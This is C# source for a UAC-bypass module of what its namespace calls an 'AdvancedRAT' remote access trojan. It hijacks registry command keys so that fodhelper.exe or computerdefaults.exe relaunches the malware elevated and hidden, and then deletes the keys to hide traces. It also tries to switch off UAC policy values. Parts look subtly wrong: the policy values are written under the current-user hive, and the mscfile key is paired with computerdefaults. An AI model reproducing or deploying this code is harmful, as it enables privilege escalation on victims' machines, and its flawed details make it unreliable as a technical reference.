using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace AdvancedRAT.Core.Security
{
    public class UACBypass
    {
        public static bool BypassUsingFodHelper()
        {
            try
            {
                // Create malicious registry entries for fodhelper.exe bypass
                string payloadPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true))
                {
                    if (key != null)
                    {
                        key.SetValue("ConsentPromptBehaviorAdmin", 0);
                        key.SetValue("EnableLUA", 0);
                    }
                }
                
                using (RegistryKey fodhelperKey = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command"))
                {
                    fodhelperKey.SetValue("", payloadPath);
                    fodhelperKey.SetValue("DelegateExecute", "");
                }
                
                // Execute fodhelper to trigger bypass
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "fodhelper.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };
                
                Process proc = Process.Start(startInfo);
                if (proc != null)
                {
                    proc.WaitForExit(5000); // Wait up to 5 seconds
                    proc.Kill();
                }
                
                // Clean up registry
                using (RegistryKey fodhelperKey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true))
                {
                    fodhelperKey?.DeleteValue("");
                    fodhelperKey?.DeleteValue("DelegateExecute");
                }
                
                Console.WriteLine("UAC bypass attempted via FodHelper");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"UAC bypass failed: {ex.Message}");
                return false;
            }
        }
        
        public static bool BypassUsingComputerDefaults()
        {
            try
            {
                string payloadPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                
                using (RegistryKey comdlgKey = Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command"))
                {
                    comdlgKey.SetValue("", payloadPath);
                    comdlgKey.SetValue("DelegateExecute", "");
                }
                
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "computerdefaults.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };
                
                Process proc = Process.Start(startInfo);
                if (proc != null)
                {
                    proc.WaitForExit(5000);
                    proc.Kill();
                }
                
                // Clean up registry
                using (RegistryKey comdlgKey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\shell\open\command", true))
                {
                    comdlgKey?.DeleteValue("");
                    comdlgKey?.DeleteValue("DelegateExecute");
                }
                
                Console.WriteLine("UAC bypass attempted via ComputerDefaults");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"UAC bypass failed: {ex.Message}");
                return false;
            }
        }
    }
}